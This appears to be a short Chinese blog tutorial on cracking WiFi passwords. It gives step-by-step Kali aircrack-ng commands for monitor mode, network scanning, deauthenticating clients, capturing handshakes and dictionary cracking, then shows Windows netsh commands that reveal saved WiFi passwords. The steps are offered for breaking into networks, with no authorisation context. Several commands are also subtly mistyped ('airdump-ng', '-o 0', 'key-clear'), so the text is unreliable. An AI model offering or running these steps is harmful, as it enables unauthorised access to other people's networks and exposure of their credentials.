随着网络技术的发展很多小朋友的日常生活中越发离不开网络了，尤其是无线网络，无线网络技术也是不停迭代都已经发展到了WiFi6了，这里我也不扯废话了，直接亮出大杀器讲解如何破解WiFi密码。

以下暴力破解WiFi的操作均在虚拟机环境下，通过Kali来进行的。

暴力破解几部曲：

1.ifconfig查看网卡是否识别;

2airmon-ng start wlan0开启网卡监听;

3.ifconfig查看网卡是否监听成功wlan0mon;

4.airdump-ng wlan0mon扫描附近WiFi;




5.airdump-ng --bssid 设备MAC -c 1 -w /home wlan0mon查看设备连接的WiFi;

6.抓包aireplay-ng -o 0 -a 路由器MAC -c 连接设备的mac wlan0mon

7.破解WiFi密码：aircrack-ng -w 字典路径 完成抓包cap文件路径


如何查看笔记本电脑连接过的WiFi以及密码

1.运行CMD，运行netsh wlan show profiles即可查看笔记本电脑曾经连接过的所有无线网络的名称；


2.再执行netsh wlan show profiles wifi-名称 key-clear,即可显示所查询对应名称的WiFi密码，其中关键内容就表示WiFi密码。
